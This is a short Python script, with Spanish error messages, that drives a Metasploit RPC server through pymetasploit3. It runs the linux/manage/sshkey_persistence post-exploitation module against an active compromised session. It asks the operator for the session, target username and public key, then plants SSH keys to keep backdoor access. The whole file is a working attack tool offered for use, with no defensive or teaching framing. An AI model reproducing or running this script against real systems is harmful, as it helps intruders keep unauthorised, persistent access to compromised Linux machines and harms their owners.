from pymetasploit3.msfrpc import *


try:
    client = MsfRpcClient('backindoor', port=55552, ssl=False)
    if client.sessions.list:
        module = client.modules.use('post', 'linux/manage/sshkey_persistence')
        print(module.description)
        in1 = input('MSF Session [1] -> ')
        in2 = input('Username [all] -> ')
        in3 = input('Public key [all] -> ')
        in4 = input('SSHD config [default] -> ')
        in5 = input('Create SSHD folder [no] -> ')
        if in1 != '':
            module['SESSION'] = int(in1)
        else: module['SESSION'] = int(list(client.sessions.list.keys())[0])
        if in2 != '':
            module['USERNAME'] = in2
        if in3 != '':
            module['PUBKEY'] = in3
        if in4 != '':
            module['SSHD_CONFIG'] = in4
        if in5 != '':
            module['CREATESSHFOLDER'] = in5

        console_id = client.consoles.console().cid
        console = client.consoles.console(console_id)
        print(console.run_module_with_output(module))
        console.destroy()


    else: print('-- ERROR: Requiere al menos una sesion MSF activa')
    

except:
    print('-- ERROR: No hay servidor RPC activo')